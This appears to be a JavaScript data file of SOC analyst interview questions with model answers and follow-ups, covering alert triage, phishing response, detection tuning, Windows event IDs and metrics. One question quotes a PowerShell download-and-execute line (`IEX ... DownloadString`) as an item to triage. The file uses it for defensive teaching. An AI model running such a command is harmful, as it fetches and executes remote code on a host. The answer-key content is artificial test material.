// SOC analyst. The largest hiring funnel in Indian security, and the one where
// candidates arrive with the most theory and the least practice.
//
// `slug` is permanent: the question id is built from role, level and slug, so
// reordering this file never renames anything or orphans an attempt.

export const SOC = [
  /* ------------------------------------------------------- fresher */
  {
    slug: 'ssh-bruteforce', level: 'fresher', topic: 'triage', difficulty: 2,
    prompt: 'An alert fires: several failed SSH logins from one IP, then a successful one. What do you do first?',
    answer: 'Scope before acting. Which account succeeded, is the source internal or external, and does that account normally sign in from there. Then look at what the session did afterwards, especially sudo or any new key added. The failure that sinks candidates is calling it a brute force and closing it without reading what happened after the success.',
    followUps: [
      { prompt: 'The success was on a different account from the failures. Does that change your read?',
        answer: 'It makes it worse. Failures on one account and a success on another points at spraying across accounts, or at an attacker who already had working credentials while the failures were noise. The next question is what else that account touched and whether there were quiet successes you never alerted on.' },
      { prompt: 'The account belongs to a developer who says it was him. How do you verify?',
        answer: 'Do not take the word alone, and do not treat doubting him as an accusation. Match the source address against his known locations and VPN logs, check the client version, and line the timing up against his working hours. Even if he was working, three failures on somebody else\'s account still needs explaining.' },
    ],
  },
  {
    slug: 'ids-vs-ips', level: 'fresher', topic: 'detection', difficulty: 1,
    prompt: 'What is the difference between an IDS and an IPS?',
    answer: 'An IDS observes and alerts; an IPS sits inline and can drop. The difference that matters operationally is consequence: a false positive on an IDS is noise, a false positive on an IPS is an outage. That is why signatures go out in detect mode first and get promoted to block only once the noise is understood.',
    followUps: [
      { prompt: 'Your IPS is dropping legitimate traffic. What do you change first?',
        answer: 'Move the offending signature to alert-only. Not the whole policy, and not the device. That stops the damage while keeping visibility, and gives you the traffic to decide whether to tune the rule, exempt the source, or fix the application that is tripping it.' },
      { prompt: 'Who signs off on that change, and what goes in the ticket?',
        answer: 'Whoever owns the control, with the application owner informed. The ticket records which rule, what traffic it matched, what the temporary state is, when it will be reviewed, and who approved it. A tuning change with no review date quietly becomes a permanent blind spot.' },
    ],
  },
  {
    slug: 'phishing-report', level: 'fresher', topic: 'phishing', difficulty: 2,
    prompt: 'A user reports a phishing email. Walk me through what you do.',
    answer: 'Preserve the original with full headers before anything else. Pull sender, reply-to, originating address, authentication results, links and attachments, and detonate anything live in a sandbox rather than on your own machine. Then find out who else received it and whether anyone interacted.',
    followUps: [
      { prompt: 'The user already clicked. What changes?',
        answer: 'It stops being analysis and becomes containment. Find out what the page asked for and whether credentials went in. If they did, reset the password and invalidate active sessions and tokens, not just the password, then check for mailbox rules created after the click, which is the usual first move after a mailbox compromise.' },
      { prompt: 'How do you find everyone else who got it?',
        answer: 'Search the mail platform by sender, originating address and URL, not just the exact subject, because the campaign varies it. Then separate delivered from opened from clicked, purge what is left in mailboxes, and report those three numbers, because that is what the business will ask for.' },
    ],
  },
  {
    slug: 'url-to-render', level: 'fresher', topic: 'fundamentals', difficulty: 1,
    prompt: 'You type a URL and press enter. Walk me through what happens, and tell me where you would look if it broke.',
    answer: 'DNS resolution, TCP connection, TLS handshake, HTTP request, response, render. The interviewer is not testing recall; they are testing whether you can hang investigation on the model. A strong answer names what fails at each step and what you would check to prove it, rather than reciting the sequence.',
    followUps: [
      { prompt: 'It resolves but times out. Which layer do you suspect?',
        answer: 'Resolution worked, so the problem is after DNS: routing, a firewall silently dropping rather than rejecting, or a dead service. A reject gives you a fast refusal; a timeout usually means something is dropping packets on purpose. Trace the path and test the port directly rather than reloading the browser.' },
      { prompt: 'It loads but the browser warns about the certificate. What are the possibilities, in order?',
        answer: 'Most likely the dull ones: expired certificate, wrong hostname, or an incomplete chain. Then an inspection proxy injecting its own certificate, which is normal on a corporate network. Interception by someone you did not invite is real but last, and you confirm it by comparing the issuer with what you expect, not by guessing.' },
    ],
  },
  {
    slug: 'unknown-alert', level: 'fresher', topic: 'process', difficulty: 2,
    prompt: 'You are on L1 and an alert type you have never seen before lands in the queue. Walk me through it.',
    answer: 'The honest answer is a method, not knowledge. Read what the rule is actually looking for, find the raw events behind it, establish whether the behaviour is normal for that host or account, and check whether it has fired before and how it was closed. Escalate with what you found, not with the alert forwarded untouched.',
    followUps: [
      { prompt: 'Nobody senior is online and it looks serious. What do you do?',
        answer: 'Act on the reversible things and escalate the rest. Collect and preserve evidence, follow whatever containment the runbook already authorises for L1, and page according to the escalation path rather than waiting for a shift change. Err towards waking someone: an unnecessary call costs far less than a missed hour.' },
      { prompt: 'It turns out to be benign. Does anything still need doing?',
        answer: 'Yes, or you will spend the rest of the year reading it. Write down why it was benign in terms specific enough for the next analyst, and either tune the rule or record that it stays noisy for a reason. An alert that keeps arriving with no decision attached is how a queue stops being read at all.' },
    ],
  },
  {
    slug: 'threat-vuln-risk', level: 'fresher', topic: 'fundamentals', difficulty: 1,
    prompt: 'What is the difference between a vulnerability, a threat and a risk?',
    answer: 'A vulnerability is a weakness, a threat is something that could exploit it, and risk is the combination weighed by likelihood and impact. The useful version is practical: an unpatched server is a vulnerability, a group that exploits that software is a threat, and the risk depends on whether that server is exposed and what it holds.',
    followUps: [
      { prompt: 'Two servers have the same critical CVE. One is in the DMZ, one is on an isolated test VLAN. Same risk?',
        answer: 'No, and this is exactly why severity alone does not prioritise anything. Same vulnerability, very different exposure and impact. Patch the exposed one first and say so in those terms, because that is the sentence that gets you taken seriously by people who own uptime.' },
      { prompt: 'The test VLAN turns out to have a route to production. Now what?',
        answer: 'The risk rating was wrong because the network diagram was wrong, which is the normal case. Re-rate it, patch it, and then raise the route itself as the bigger finding: an isolated segment that is not isolated invalidates every other risk decision that assumed it was.' },
    ],
  },
  {
    slug: 'what-siem-does', level: 'fresher', topic: 'tooling', difficulty: 1,
    prompt: 'What is a SIEM actually doing, and what is it not doing?',
    answer: 'It collects logs from many sources, normalises them into a common shape, correlates across them, and raises alerts on rules you wrote. What it is not doing is understanding your environment or finding things nobody asked it to look for. A SIEM with no tuned rules and no log sources that matter is an expensive search bar.',
    followUps: [
      { prompt: 'Leadership asks why the SIEM missed something. How do you answer?',
        answer: 'Find out which of three things failed before answering: the log never arrived, the log arrived but no rule looked for that behaviour, or a rule fired and nobody acted. They need completely different fixes, and saying "the SIEM missed it" hides which one it was. Answer with the specific gap and what closes it.' },
      { prompt: 'Which log sources would you fight for first, with a limited budget?',
        answer: 'Identity and endpoint, in that order. Authentication tells you who did what, and endpoint telemetry tells you what actually ran. Firewall and proxy logs are high volume and easy to buy but answer fewer questions on their own. Say what you would cut, not just what you would add, because that is the real question.' },
    ],
  },
  {
    slug: 'beaconing-host', level: 'fresher', topic: 'triage', difficulty: 2,
    prompt: 'A laptop is reaching out to the same external address every sixty seconds, give or take a few. What do you check?',
    answer: 'Regular intervals with small jitter mean automation, not a person. Establish which process is making the connection, what the destination is and how long it has been running, and whether other hosts do the same. Beaconing is a shape, and plenty of legitimate software has that shape too.',
    followUps: [
      { prompt: 'The destination is a well-known cloud provider. Does that clear it?',
        answer: 'No. Hosting on a reputable provider is cheap and extremely common for command and control, precisely because the domain looks harmless and often cannot be blocked wholesale. Judge it on the process making the call and what it sends, not on who owns the address range.' },
      { prompt: 'It turns out to be a legitimate agent nobody documented. What do you do with that?',
        answer: 'Close the alert and then fix the real problem, which is that an unknown agent was running on a managed laptop. Get it into the asset and software inventory, and raise that the inventory is incomplete. The next unexplained beacon should be answerable in minutes, not hours.' },
    ],
  },
  {
    slug: 'why-soc', level: 'fresher', topic: 'behavioural', difficulty: 1,
    prompt: 'Why security, and why a SOC role specifically?',
    answer: 'The weak answer is "I am passionate about cybersecurity". The strong one is concrete: something you actually did, what it taught you, and why the SOC in particular rather than security in general. Mentioning that you want the volume and pattern exposure a SOC gives early in a career shows you understand what the job is.',
    followUps: [
      { prompt: 'Where do you want to be in three years? Say pentesting, and watch what happens.',
        answer: 'Be honest, because the usual lie is obvious and they have heard it. If you want to move towards hunting, detection engineering or offensive work, say so and say what the SOC gives you on the way there. Managers plan around real ambitions. They lose people who pretended not to have any.' },
      { prompt: 'This role is on rotating shifts including nights. Still interested?',
        answer: 'Answer the question that is really being asked, which is whether you will quit in four months. Say plainly whether nights work for you. Agreeing to something you cannot sustain is worse for you than for them, and the ones who handle this honestly in the room are the ones who last.' },
    ],
  },

  /* ----------------------------------------------------------- mid */
  {
    slug: 'signed-binary', level: 'mid', topic: 'endpoint', difficulty: 2,
    prompt: 'Your EDR flags a signed binary behaving unusually. How do you triage it?',
    answer: 'A valid signature says who built it, not that this execution is safe. Look at the behaviour chain: parent process, command line, network destinations, files written, persistence created. Signed system tools get abused for living-off-the-land execution precisely because reputation scoring waves them through.',
    followUps: [
      { prompt: 'The signature is valid and the vendor is well known. Still suspicious?',
        answer: 'Yes, if the behaviour does not match what that binary exists to do. A known-good tool launched by an unusual parent, with arguments that fetch a remote payload, is a standard abuse pattern. The question is whether this execution is expected on this host, not whether the file is malicious in general.' },
      { prompt: 'You decide to contain. What exactly, and what do you tell the business?',
        answer: 'Isolate at the network level while keeping your own access, rather than powering off and losing memory. Block the destination at the egress point. Then tell the business which host, what the user can no longer do, what you need from them, and when you will next update them. Vague updates are what turn an incident into a political problem.' },
    ],
  },
  {
    slug: 'rule-tuning', level: 'mid', topic: 'tuning', difficulty: 2,
    prompt: 'How do you tune a noisy detection rule without going blind to the thing it was built for?',
    answer: 'Start from what the rule is meant to catch, then measure what it is actually matching. Narrow on the attribute that separates benign from malicious, usually a specific process, account or destination, rather than lowering severity or widening the window. Record the exclusion and the reason, so the next analyst can see the gap you accepted.',
    followUps: [
      { prompt: 'The noise comes from one application the business will not change. Now what?',
        answer: 'Scope the exclusion as tightly as the application allows: that service account, on those hosts, to those destinations. Add a narrower compensating rule that would still fire if the excluded pattern were abused, and write down the residual risk so it is a decision on record rather than a silent hole.' },
      { prompt: 'Six months later, how do you know the tuning is still right?',
        answer: 'Review exclusions on a schedule and test them. Confirm the application still behaves the way the exclusion assumes, and validate that the rule still fires on the original behaviour using an atomic test. An exclusion nobody has revisited is a control nobody can vouch for.' },
    ],
  },
  {
    slug: 'coverage-real', level: 'mid', topic: 'detection', difficulty: 3,
    prompt: 'How do you know your detection coverage is real and not just a long list of rules?',
    answer: 'Map detections to attacker behaviours rather than counting rules, then test them. A framework like ATT&CK gives you the map; atomic tests tell you whether the rule actually fires in your environment with your log sources. Coverage you have never fired is a claim, not a control.',
    followUps: [
      { prompt: 'Your map shows green across the board. Do you believe it?',
        answer: 'No, and saying so is the right answer. A green map usually means coverage was recorded when the rule was written, not verified since. Log sources get dropped, agents fall off hosts, and parsers break quietly. Treat the map as a to-test list rather than a report card.' },
      { prompt: 'You find a technique you genuinely cannot detect. What do you do with it?',
        answer: 'Write it down as a known gap with what it would take to close it, which is usually a log source or a licence rather than cleverness. Then look for a compensating detection one step earlier or later in the chain. A documented gap with an owner beats an undocumented one that someone assumes is covered.' },
    ],
  },
  {
    slug: 'incident-walkthrough', level: 'mid', topic: 'behavioural', difficulty: 2,
    prompt: 'Walk me through an incident you actually handled, start to finish.',
    answer: 'Pick one you can tell honestly, including what went wrong. Structure it: how it was detected, what you first thought, what changed your mind, what you contained, and what the organisation changed afterwards. The part interviewers listen hardest for is the moment your first theory was wrong and how you noticed.',
    followUps: [
      { prompt: 'What would you do differently?',
        answer: 'Have a real answer. "Nothing" reads as either inexperience or no reflection. Name something specific, such as containing before fully scoping and losing visibility, or not getting the business on a call early enough, and say what you changed afterwards so it did not repeat.' },
      { prompt: 'Who did you escalate to, and when?',
        answer: 'They are checking whether you understand that escalation is a decision with a cost both ways. Name the trigger you used, not just the person. Candidates who escalate everything are as hard to staff around as candidates who escalate nothing.' },
    ],
  },
  {
    slug: 'siem-cost', level: 'mid', topic: 'tooling', difficulty: 2,
    prompt: 'Your SIEM ingest cost has doubled and you have been told to cut it. What goes?',
    answer: 'Start from which logs have ever been used in a detection or an investigation, because the bill usually hides a few enormous, useless sources. Cut volume before cutting sources: filter noisy event types, sample what is only ever used in aggregate, and move long-tail data to cheaper storage you can still search when it matters.',
    followUps: [
      { prompt: 'Finance wants you to drop endpoint logs because they are the biggest line.',
        answer: 'Push back with what breaks, in their language: name the detections that stop working and the investigations that become impossible. Then offer the alternative, which is usually filtering at the agent and shortening hot retention rather than dropping the source. Agreeing quietly and losing the capability silently is the failure mode.' },
      { prompt: 'Six months later nobody remembers what was cut. How do you prevent that?',
        answer: 'Record the cut as a risk decision with an owner and a review date, not as a config change in a ticket. Put the affected detections in the same record. When the next incident hits a blind spot, the question becomes who accepted it and when, which is a fair conversation, rather than why security missed it.' },
    ],
  },
  {
    slug: 'shift-handover', level: 'mid', topic: 'process', difficulty: 2,
    prompt: 'How do you hand over a live incident at shift change?',
    answer: 'Written, not verbal, and structured: what is known, what is believed but unconfirmed, what has been done including anything you changed, what is pending and who owns it, and the next decision point. The common failure is handing over conclusions without the evidence, so the next shift cannot tell what to re-check.',
    followUps: [
      { prompt: 'The incoming analyst disagrees with your read. What should happen?',
        answer: 'Good, that is the handover working. Separate what is observed from what is inferred and let them re-examine the inference against the evidence. The handover note should make that possible without you in the room. If disagreement feels like a challenge rather than a check, the process is broken.' },
      { prompt: 'What do you deliberately leave out?',
        answer: 'Speculation dressed as fact, and the running commentary. Keep the timeline, the evidence and the open decisions. A handover that includes every thought anyone had during the shift is one nobody reads, which is the same as no handover at all.' },
    ],
  },
  {
    slug: 'closed-wrongly', level: 'mid', topic: 'process', difficulty: 2,
    prompt: 'An analyst on your team closed a true positive as benign. How do you handle it?',
    answer: 'Handle the incident first, then the cause. Reopen, scope what was missed and how long it ran. Then look at why it was closable: was the evidence genuinely ambiguous, was the queue too deep to read properly, or was the runbook wrong. One analyst making one call is almost never the real finding.',
    followUps: [
      { prompt: 'It turns out the runbook told them to close it. Now what?',
        answer: 'Then the analyst did their job and the runbook is the defect. Fix it, and say so publicly to the team, because the alternative teaches everyone that following the process is risky. That lesson costs far more than this incident did.' },
      { prompt: 'How do you catch this class of mistake earlier next time?',
        answer: 'Sample closed alerts, not just open ones. A small weekly review of a random handful of benign closures catches both bad runbooks and queue pressure, and it does it without singling anyone out. Reviewing only what blew up means you only ever learn from the ones that blew up.' },
    ],
  },

  /* ----------------------------------------- batch 1 (added 2026-11-22) */
  {
    slug: "read-auth-line", level: "fresher", topic: "log-reading", difficulty: 1,
    prompt: "Here is one line from an auth log: `Failed password for invalid user admin from 203.0.113.5`. What does it tell you, and what does it not?",
    answer: "It tells you someone tried to log in as admin, that the account does not exist on this host, that it came from that IP, and that it failed. It does not tell you whether this is one stray attempt or one of thousands, whether it is automated or aimed at you, or whether anything succeeded. A candidate who has read logs separates the fact in the line from the story they want to put around it.",
    followUps: [
      { prompt: "The same IP has four hundred of these in ten minutes. Does your read change?",
        answer: "The volume says spray or brute force, not a targeted human, and invalid user says they are guessing account names that do not exist. Still low severity on its own. The thing I now look for is a line that is not a failure." },
      { prompt: "There is one Accepted password line in the middle of them. Now what?",
        answer: "That flips it. A success in the middle of a brute force is the whole event. I scope that account, that source, and that session, and I start looking for what they did after they were in, not at the failures before." },
    ],
  },
  {
    slug: "internet-is-slow", level: "fresher", topic: "network", difficulty: 1,
    prompt: "A user says the internet is slow. From a SOC seat, what could that mean to you that it does not mean to them?",
    answer: "To them it is an annoyance. To a SOC it is a possible symptom: a link saturated by exfiltration, a host beaconing hard, a denial-of-service, or a proxy failing. I do not diagnose the complaint, I ask what the traffic looks like, because slow is sometimes the only thing a user notices when something is leaving the network.",
    followUps: [
      { prompt: "Where do you look first?",
        answer: "Egress: the proxy, firewall, or netflow for throughput and top talkers, and whether anything is going somewhere it should not. The complaint points at the link; the answer is in what is using it." },
      { prompt: "The top talker is one internal host sending to one external IP, a steady two megabytes a second for an hour. Your read?",
        answer: "A steady, long, one-to-one transfer is exfiltration-shaped, not browsing. I scope the host, check the destination's reputation and who it belongs to, and find the process doing it before I decide it is backup traffic." },
    ],
  },
  {
    slug: "encoded-powershell", level: "fresher", topic: "encoding", difficulty: 2,
    prompt: "You see `powershell -enc SQBFAFgA...` in a process-creation log. What is it, and what do you do?",
    answer: "The -enc flag runs base64-encoded PowerShell, where the base64 decodes to UTF-16LE text. It is a common obfuscation but not proof of anything on its own, since admins and installers use it too. I decode it and judge it on what it actually does, rather than reacting to the flag.",
    followUps: [
      { prompt: "Decoded, it is `IEX (New-Object Net.WebClient).DownloadString('http://...')`. Severity?",
        answer: "High. That is download-and-execute from an external URL: pull code off the internet and run it in memory. I isolate the host, grab the URL and what it served, and work out what ran and under whose account." },
      { prompt: "The user is a developer who does this every day. Still high?",
        answer: "The context lowers it but does not zero it. I confirm it is their known pattern and not a lookalike, because a thing this user does daily is also exactly how a real one hides in plain sight." },
    ],
  },
  {
    slug: "windows-event-ids", level: "fresher", topic: "windows", difficulty: 2,
    prompt: "Which Windows event IDs do you actually watch, and why those?",
    answer: "The ones that show access, privilege, and persistence, not a memorised list: 4625 and 4624 for failed and successful logons with their type, 4672 for a logon granted special privileges, 4688 for process creation, 4720 for a new account, 7045 for a new service. I would rather know cold why each of those matters than recite twenty I have never alerted on.",
    followUps: [
      { prompt: "You see 4672 for a service account at three in the morning. Interesting?",
        answer: "Potentially. A special-privilege logon for a service account off-hours is worth a look, but it depends on whether that account is meant to run scheduled or interactive work. The question is whether this matches how it normally behaves." },
      { prompt: "How do you tell a scheduled task from someone logging in at the keyboard?",
        answer: "The logon type: 2 is interactive, 3 network, 4 batch, 5 service, 10 remote desktop. The type is the tell, and it is why I said with their type rather than just the event number." },
    ],
  },
  {
    slug: "mitre-day-to-day", level: "mid", topic: "mitre", difficulty: 2,
    prompt: "How do you actually use MITRE ATT&CK day to day, beyond putting it on a slide?",
    answer: "As a coverage map and a shared language. I map detections to techniques to find the gaps, and I tag alerts with the technique so triage knows what stage it is. What I do not do is treat it as a checklist to cover everything, which is how you end up with a wall of weak detections. Someone who has used it talks about gaps and trade-offs, not completeness.",
    followUps: [
      { prompt: "Your manager wants a hundred percent ATT&CK coverage. Your response?",
        answer: "Coverage is not a percentage. Some techniques your telemetry cannot see, some are not worth the noise, and a detection that exists only to tick a box is worse than an honest gap. I would prioritise by the threats that actually target us and the data we already have." },
      { prompt: "A technique you genuinely cannot detect: what do you do with it?",
        answer: "Document the gap, decide whether the telemetry to close it is worth adding, and compensate elsewhere in the chain if it is not. A written, known gap is an asset. A fake detection over it is a liability, because it tells you you are safe when you are not." },
    ],
  },
  {
    slug: "lateral-in-logs", level: "mid", topic: "lateral-movement", difficulty: 3,
    prompt: "What does lateral movement actually look like in your logs, as opposed to in a diagram?",
    answer: "A pattern across hosts, not a single event: one account authenticating to many machines in a short window, type-3 network logons to systems it never normally touches, use of admin shares, PsExec or WMI, and new service installs appearing on the targets. The arrow in the diagram is, in the data, a spray of ordinary-looking logons that are wrong only in aggregate.",
    followUps: [
      { prompt: "If you could weight one signal above the rest, which?",
        answer: "An account authenticating to hosts outside its normal set, especially with administrative rights. The specific tool matters less than the deviation from what that account usually touches." },
      { prompt: "You have no baseline of what is normal. Now what?",
        answer: "I build a rough one from the data I do have, who normally logs into what, or I lean on the structural tells that are suspicious regardless: a service install on a workstation, PsExec between peers, a brand-new admin account. Some things do not need a baseline to look wrong." },
    ],
  },
  {
    slug: "two-alerts-one-minute", level: "mid", topic: "triage", difficulty: 2,
    prompt: "Same minute, one analyst: a malware detection auto-quarantined on a finance laptop, and a single failed VPN login for the CFO. Which do you take first, and why?",
    answer: "The VPN one, briefly. Auto-quarantine means the EDR has already acted, so that laptop is probably contained; a failed login on a high-value account could be the front edge of something that is not contained yet. I prioritise by what is still live and who it touches, not by which label sounds scarier.",
    followUps: [
      { prompt: "The failed VPN login was the CFO mistyping their password, confirmed. Back to the malware?",
        answer: "Yes, and now I treat it properly: what the sample was, how it arrived, whether it ran before quarantine caught it, and whether anything else on that host is affected." },
      { prompt: "How do you know the quarantine actually held?",
        answer: "I check the EDR action succeeded, the file is neutralised, no child processes spawned before it was caught, and there were no network callouts. Quarantined in the console is a claim; I want to see it was quarantined in time." },
    ],
  },
  {
    slug: "soc-board-metrics", level: "mid", topic: "metrics", difficulty: 3,
    prompt: "You are asked for SOC metrics for a board deck. What do you report, and what do you refuse to report?",
    answer: "I report things that reflect outcomes: how fast we detect and respond, our true-positive rate, gaps we have closed. I refuse vanity numbers like alerts processed or threats blocked, which reward noise and sound impressive while saying nothing. Part of the job is protecting the board from a number that would mislead them.",
    followUps: [
      { prompt: "The board loves threats blocked: two million. You know it is mostly firewall noise. What do you do?",
        answer: "I reframe it honestly: that figure is traffic, not threats, and I offer a metric that means something, even if the number is smaller and less flattering. A true small number beats an impressive false one." },
      { prompt: "Your mean-time-to-respond looks bad this quarter because of one long incident. Report it?",
        answer: "Yes, with the context. Hiding it is how metrics lose trust. One explained outlier is more credible than a smooth average someone quietly massaged, and the board can handle the truth better than finding out later." },
    ],
  },

];
